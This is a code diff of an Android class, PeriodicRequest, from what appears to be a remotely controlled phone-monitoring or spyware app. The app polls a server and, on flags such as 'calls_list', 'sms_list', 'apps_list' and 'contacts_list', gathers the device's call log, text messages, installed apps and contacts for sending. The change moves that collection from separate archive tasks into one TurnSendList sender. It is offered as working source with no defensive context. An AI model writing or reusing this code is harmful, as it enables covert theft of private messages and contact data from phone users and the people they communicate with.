@@ -11,13 +11,10 @@ import android.content.SharedPreferences.Editor;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 
-import com.inet.android.archive.ArchiveCall;
-import com.inet.android.archive.ArchiveSms;
-import com.inet.android.archive.ListApp;
-import com.inet.android.contacts.GetContacts;
 import com.inet.android.db.RequestDataBaseHelper;
 import com.inet.android.db.RequestWithDataBase;
 import com.inet.android.info.GetInfo;
+import com.inet.android.list.TurnSendList;
 import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.Logging;
 
@@ -31,6 +28,7 @@ public class PeriodicRequest extends DefaultRequest {
 	private final String LOG_TAG = "PeriodicRequest";
 	static RequestDataBaseHelper db;
 	SmsSentObserver smsSentObserver = null;
+	TurnSendList sendList;
 	private final int type = 2;
 	boolean periodicalFlag = true;
 	Context ctx;
@@ -105,12 +103,11 @@ public class PeriodicRequest extends DefaultRequest {
 	protected void getRequestData(String response) {
 		Logging.doLog(LOG_TAG, "getResponseData: " + response,
 				"getResponseData: " + response);
-		String statusCallList = "";
 
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(ctx);
 		Editor ed = sp.edit();
-
+		sendList = new TurnSendList(ctx);
 		JSONObject jsonObject;
 		try {
 			jsonObject = new JSONObject(response);
@@ -293,22 +290,29 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("brk_to", "");
 		}
+		// ---------------calls list------------------------
+
+		try {
+			str = jsonObject.getString("calls_list");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null && str.equals("1")
+				&& sp.getString("list_call", "0").equals("0")) {
+			sendList.setList(1, str, null);
+			sendList.startGetList();
+
+		}
 		// ---------------sms list------------------------
 		try {
 			str = jsonObject.getString("sms_list");
 		} catch (JSONException e) {
 			str = null;
-			Logging.doLog(LOG_TAG, "sms null ", "sms null ");
-
 		}
-		if (str != null && str.equals("1")) {
-			ed.putString("sms_list", str);
-			ed.putString("status_sms_list", "1");
-			ArchiveSms arhSms = new ArchiveSms();
-			arhSms.execute(ctx);
-
-		} else {
-			// ed.putString("sms_list", "0");
+		if (str != null && str.equals("1")
+				&& sp.getString("list_sms", "0").equals("0")) {
+			sendList.setList(2, str, null);
+			sendList.startGetList();
 		}
 		// ---------------apps list------------------------
 
@@ -319,32 +323,13 @@ public class PeriodicRequest extends DefaultRequest {
 			Logging.doLog(LOG_TAG, "apps null ", "apps null ");
 
 		}
-		if (str != null && str.equals("1")) {
-			ed.putString("app_list", "1");
-			ListApp listApp = new ListApp();
-			listApp.getListOfInstalledApp(ctx);
-		} else {
-			 ed.putString("apps_list", "0");
-		}
-		// ---------------calls list------------------------
+		if (str != null && str.equals("1")
+				&& sp.getString("list_app", "0").equals("0")) {
+			sendList.setList(3, str, null);
+			sendList.startGetList();
 
-		try {
-			str = jsonObject.getString("calls_list");
-			statusCallList = sp.getString("statusCallList", "0");
-			Logging.doLog(LOG_TAG, str + statusCallList, str + statusCallList);
-		} catch (JSONException e) {
-			str = null;
-			Logging.doLog(LOG_TAG, "null calls", "null calls");
 		}
-		if (str != null && str.equals("1")) {
-			ArchiveCall arhCall = new ArchiveCall();
-			arhCall.execute(ctx);
-			ed.putString("calls_list", str);
-			ed.putString("statusCallList", "1");
 
-		} else {
-			ed.putString("calls_list", "0");
-		}
 		// ---------------contacts list------------------------
 
 		try {
@@ -354,12 +339,10 @@ public class PeriodicRequest extends DefaultRequest {
 			Logging.doLog(LOG_TAG, "contacts null ", "contacts null ");
 
 		}
-		if (str != null && str.equals("1")) {
-			ed.putString("contacts_list", str);
-			GetContacts getCont = new GetContacts();
-			getCont.execute(ctx);
-		} else {
-			// ed.putString("contacts_list", "0");
+		if (str != null && str.equals("1")
+				&& sp.getString("list_contact", "0").equals("0")) {
+			sendList.setList(4, str, null);
+			sendList.startGetList();
 		}
 		// ---------------error------------------------
 
